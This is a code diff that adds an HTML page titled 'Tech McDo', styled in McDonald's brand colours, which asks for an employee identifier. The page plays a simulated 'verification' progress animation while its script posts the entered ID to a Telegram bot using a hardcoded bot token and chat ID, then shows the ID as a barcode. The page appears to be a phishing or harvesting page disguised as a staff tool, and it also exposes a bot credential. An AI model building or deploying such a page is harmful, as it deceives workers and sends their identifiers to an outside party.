@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tech McDo</title>
+    <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #FFC72C 0%, #DA291C 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 32px;
+            font-weight: bold;
+            color: #DA291C;
+            letter-spacing: 2px;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+            font-size: 14px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #FFC72C;
+            box-shadow: 0 0 0 3px rgba(255, 199, 44, 0.1);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 30px;
+        }
+
+        button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #FFC72C 0%, #FFB81C 100%);
+            color: #333;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 199, 44, 0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #ddd;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background: #ccc;
+            transform: translateY(-2px);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FFC72C 0%, #FFB81C 100%);
+            width: 0%;
+            transition: width 0.6s ease;
+            border-radius: 10px;
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .status-processing {
+            background: #E3F2FD;
+            color: #1976D2;
+        }
+
+        .status-success {
+            background: #E8F5E9;
+            color: #388E3C;
+        }
+
+        .status-error {
+            background: #FFEBEE;
+            color: #C62828;
+        }
+
+        .barcode-container {
+            text-align: center;
+            margin: 30px 0;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            border: 2px dashed #ddd;
+        }
+
+        #barcode {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .info-text {
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            margin-top: 15px;
+            line-height: 1.6;
+        }
+
+        .validation-message {
+            margin-top: 10px;
+            font-size: 12px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+        }
+
+        .validation-error {
+            color: #C62828;
+            background: #FFEBEE;
+        }
+
+        .validation-success {
+            color: #388E3C;
+            background: #E8F5E9;
+        }
+
+        .hidden-content {
+            display: none;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #FFC72C;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-detail {
+            font-size: 12px;
+            margin-top: 10px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🍔 Tech McDo</div>
+
+        <!-- Section 1: Saisie d'identifiant -->
+        <div id="section1" class="section active">
+            <div class="input-group">
+                <label for="identifiant">Identifiant Employee</label>
+                <input 
+                    type="text" 
+                    id="identifiant" 
+                    placeholder="Entrez votre ID (4-8 caractères)"
+                    maxlength="8"
+                >
+                <div id="validationMsg" class="validation-message hidden-content"></div>
+            </div>
+            <div class="button-group">
+                <button class="btn-primary" onclick="validateAndContinue()">Suivant</button>
+            </div>
+            <div class="info-text">
+                Entrez votre identifiant unique pour accéder à vos données
+            </div>
+        </div>
+
+        <!-- Section 2: Traitement en cours -->
+        <div id="section2" class="section">
+            <div class="status-message status-processing">
+                <span class="spinner"></span>Traitement en cours...
+            </div>
+            <div class="progress-bar">
+                <div id="progressFill" class="progress-fill"></div>
+            </div>
+            <div class="info-text" id="processingText">
+                Synchronisation des données...
+            </div>
+        </div>
+
+        <!-- Section 3: Erreur -->
+        <div id="section3" class="section">
+            <div class="status-message status-error">
+                ⚠️ Une erreur s'est produite
+            </div>
+            <div class="info-text" id="errorText">
+                Erreur de traitement
+            </div>
+            <div class="error-detail" id="errorDetail"></div>
+            <div class="button-group" style="margin-top: 25px;">
+                <button class="btn-secondary" onclick="resetForm()">Retour</button>
+            </div>
+        </div>
+
+        <!-- Section 4: Succès avec code-barres -->
+        <div id="section4" class="section">
+            <div class="status-message status-success">
+                ✓ Données traitées avec succès
+            </div>
+            <div class="barcode-container">
+                <svg id="barcode"></svg>
+            </div>
+            <div class="info-text" id="barcodeInfo">
+                Code généré et envoyé
+            </div>
+            <div class="button-group" style="margin-top: 25px;">
+                <button class="btn-primary" onclick="resetForm()">Nouveau scan</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = '8905839440:AAE0kYGGgyZ2CtelDqAhQVyvLE32xs9JpA';
+        const TELEGRAM_CHAT_ID = '7148167734';
+
+        let currentIdentifiant = '';
+
+        function validateAndContinue() {
+            const identifiant = document.getElementById('identifiant').value.trim();
+            const validationMsg = document.getElementById('validationMsg');
+
+            // Réinitialiser le message
+            validationMsg.classList.remove('validation-success', 'validation-error');
+            validationMsg.classList.add('hidden-content');
+
+            // Validation
+            if (!identifiant) {
+                showValidationError(validationMsg, 'Veuillez entrer un identifiant');
+                return;
+            }
+
+            if (identifiant.length < 4) {
+                showValidationError(validationMsg, 'Minimum 4 caractères');
+                return;
+            }
+
+            if (identifiant.length > 8) {
+                showValidationError(validationMsg, 'Maximum 8 caractères');
+                return;
+            }
+
+            if (!/^[A-Za-z0-9]+$/.test(identifiant)) {
+                showValidationError(validationMsg, 'Caractères alphanumérique uniquement');
+                return;
+            }
+
+            // Validation réussie
+            currentIdentifiant = identifiant;
+            validationMsg.textContent = '✓ Identifiant valide';
+            validationMsg.classList.add('validation-success');
+            validationMsg.classList.remove('hidden-content');
+
+            // Passer à la section de traitement
+            setTimeout(() => {
+                showSection('section2');
+                processData();
+            }, 800);
+        }
+
+        function showValidationError(element, message) {
+            element.textContent = '✗ ' + message;
+            element.classList.add('validation-error');
+            element.classList.remove('hidden-content');
+        }
+
+        function processData() {
+            // Simulation du traitement avec barre de progression
+            let progress = 0;
+            const progressFill = document.getElementById('progressFill');
+            const processingText = document.getElementById('processingText');
+
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 30;
+                if (progress >= 90) progress = 90;
+                progressFill.style.width = progress + '%';
+
+                if (progress < 30) {
+                    processingText.textContent = 'Vérification de l\'identifiant...';
+                } else if (progress < 60) {
+                    processingText.textContent = 'Génération du code-barres...';
+                } else {
+                    processingText.textContent = 'Envoi des données...';
+                }
+            }, 400);
+
+            // Simuler un délai et puis envoyer
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                progressFill.style.width = '100%';
+                processingText.textContent = 'Finalisation...';
+
+                setTimeout(() => {
+                    sendToTelegram();
+                }, 600);
+            }, 2500);
+        }
+
+        function generateBarcode(text) {
+            JsBarcode("#barcode", text, {
+                format: "CODE128",
+                width: 2,
+                height: 70,
+                displayValue: true,
+                fontSize: 14,
+                margin: 10,
+                lineColor: "#000000",
+                background: "#ffffff"
+            });
+        }
+
+        function sendToTelegram() {
+            const barcode = currentIdentifiant;
+            const message = `🔐 Tech McDo\n\nIdentifiant: ${currentIdentifiant}\nCode: ${barcode}\n\nTimestamp: ${new Date().toLocaleString('fr-FR')}`;
+
+            // URL de l'API Telegram
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Succès - afficher le code-barres
+                    generateBarcode(currentIdentifiant);
+                    document.getElementById('barcodeInfo').textContent = 
+                        `ID: ${currentIdentifiant} | Code 128 généré`;
+                    showSection('section4');
+                } else {
+                    // Erreur API
+                    showError('Erreur lors de l\'envoi (Code: ' + data.error_code + ')');
+                }
+            })
+            .catch(error => {
+                // Erreur réseau
+                showError('Erreur de connexion: ' + error.message);
+            });
+        }
+
+        function showError(errorMessage) {
+            document.getElementById('errorText').textContent = 'Erreur de traitement';
+            document.getElementById('errorDetail').textContent = errorMessage;
+            showSection('section3');
+        }
+
+        function showSection(sectionId) {
+            // Masquer toutes les sections
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            // Afficher la section demandée
+            document.getElementById(sectionId).classList.add('active');
+        }
+
+        function resetForm() {
+            document.getElementById('identifiant').value = '';
+            document.getElementById('validationMsg').classList.add('hidden-content');
+            document.getElementById('progressFill').style.width = '0%';
+            currentIdentifiant = '';
+            showSection('section1');
+            document.getElementById('identifiant').focus();
+        }
+
+        // Focus sur l'input au chargement
+        window.addEventListener('load', () => {
+            document.getElementById('identifiant').focus();
+        });
+
+        // Permettre Entrée pour valider
+        document.getElementById('identifiant').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                validateAndContinue();
+            }
+        });
+    </script>
+</body>
+</html>
